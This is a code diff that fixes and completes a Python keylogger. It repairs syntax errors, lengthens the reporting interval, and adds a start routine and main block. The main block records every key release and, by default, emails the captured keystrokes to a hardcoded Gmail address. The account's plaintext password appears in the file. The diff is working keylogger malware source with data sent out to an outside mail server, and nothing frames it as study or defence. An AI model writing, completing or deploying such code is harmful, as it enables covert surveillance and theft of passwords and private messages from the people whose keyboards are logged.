@@ -6,7 +6,7 @@ from datetime import datetime
 # initializing parameters
 import self as self
 
-SEND_REPORT_EVERY = 60  # seconds
+SEND_REPORT_EVERY = 90  # seconds
 EMAIL_ADDRESS = "pythonkeylogger@gmail.com"
 EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"
 
@@ -26,7 +26,7 @@ class KeyLogger:
         Is called whenver a keyboard event occurs ie.
         A key is released
         """
-        name - event.name
+        name = event.name
         if len(name) > 1:  # if special key
             if name == "space":
                 name = " "
@@ -71,7 +71,7 @@ class KeyLogger:
             self.update_filename()
             if self.report_method == "email":
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file"
+            elif self.report_method == "file":
                 self.report_to_file()
 
             print(f"[{self.filename}] - {self.log}")  # print in console
@@ -82,3 +82,15 @@ class KeyLogger:
         timer.daemon = True # timer dies when main thread dies
         timer.start()
 
+    def start(self):
+        self.start_dt = datetime.now()  # record start time
+        keyboard.on_release(callback=self.callback)  # start the keylogger
+        self.report()  # report the keylogs
+        keyboard.wait() # block the current thread
+
+
+if __name__ == "__main__":
+    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want the log to be recrd to a local file
+    # keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
